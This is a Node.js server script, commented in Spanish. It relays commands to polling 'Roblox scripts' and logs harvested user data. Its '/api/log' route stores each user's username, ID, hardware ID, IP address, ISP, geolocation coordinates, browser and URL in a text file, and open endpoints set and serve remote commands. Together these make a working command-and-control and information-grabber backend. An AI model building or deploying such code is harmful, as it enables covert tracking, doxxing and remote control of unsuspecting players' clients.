const http = require('http');
const fs = require('fs');

let latestCommand = ""; // Almacena el comando activo en la memoria

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    // 1. Enviar un nuevo comando desde el panel o terminal
    if (req.url === '/api/set-command' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                latestCommand = data.command || "";
                console.log(`[COMANDO NUBE] ${latestCommand}`);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "success", command: latestCommand }));
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "error", message: "JSON inválido" }));
            }
        });
    }
    // 2. Borrar / Limpiar el comando actual
    else if (req.url === '/api/clear-command' && req.method === 'POST') {
        latestCommand = "";
        console.log("[COMANDO LIMPIADO EN NUBE]");
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: "success", message: "Comando borrado" }));
    }
    // 3. Consultar comando activo (para los scripts de Roblox)
    else if (req.url === '/api/get-command' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ command: latestCommand }));
    }
    // 4. Tu ruta de logs para registrar datos de los usuarios (con filtro de duplicados)
    else if (req.url === '/api/log' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const timestamp = new Date().toISOString();
                let info = {};

                if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
                    data.embeds[0].fields.forEach(field => {
                        info[field.name] = field.value;
                    });
                }

                const currentIP = info["IP Address"] || 'N/A';
                const currentUsername = info["Username"] || 'N/A';

                fs.readFile('logs.txt', 'utf8', (err, fileContent) => {
                    let isDuplicate = false;
                    if (!err && fileContent) {
                        const lines = fileContent.split('\n');
                        let lastIpFound = '';
                        let lastUserFound = '';

                        for (let line of lines) {
                            if (line.includes('IP Address:')) {
                                lastIpFound = line.split('IP Address:')[1].trim();
                            }
                            if (line.startsWith('Username:')) {
                                lastUserFound = line.split('Username:')[1].trim();
                            }
                            if (lastIpFound === currentIP && lastUserFound === currentUsername) {
                                isDuplicate = true;
                                break;
                            }
                        }
                    }

                    if (isDuplicate) {
                        res.writeHead(200, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ status: "ignored" }));
                        return;
                    }

                    const logEntry = 
                        `${info["Username"] || 'Desconocido'}\n` +
                        `Join ID: ${info["User ID"] || 'N/A'}\n\n` +
                        `User Info\n` +
                        `Username: ${info["Username"] || 'N/A'}\n` +
                        `User ID: ${info["User ID"] || 'N/A'}\n\n` +
                        `HWID:\n${info["HWID"] || 'N/A'}\n\n` +
                        `Ubicación:\n` +
                        `País: ${info["Country"] || 'N/A'} (Región: ${info["Region"] || 'N/A'}, Ciudad: ${info["City"] || 'N/A'})\n` +
                        `Lat, Long: ${info["Lat, Long"] || 'N/A'}\n` +
                        `ISP: ${info["ISP"] || 'N/A'}\n` +
                        `IP Address: ${currentIP}\n\n` +
                        `Detalles Técnicos:\n` +
                        `Navegador / Dispositivo: ${info["Browser"] || 'N/A'}\n` +
                        `Locale: ${info["Locale"] || 'N/A'} | Status: ${info["Status"] || 'N/A'}\n` +
                        `URL: ${info["URL"] || 'N/A'}\n` +
                        `Fecha de Registro: ${timestamp}\n` +
                        `-----------------------------------------\n\n`;

                    fs.appendFile('logs.txt', logEntry, () => {});
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ status: "success" }));
                });
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "error" }));
            }
        });
    }
    else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end("Ruta no encontrada");
    }
});

const PORT = process.env.PORT || 26237;
server.listen(PORT, () => {
    console.log(`Servidor activo en el puerto ${PORT}`);
});
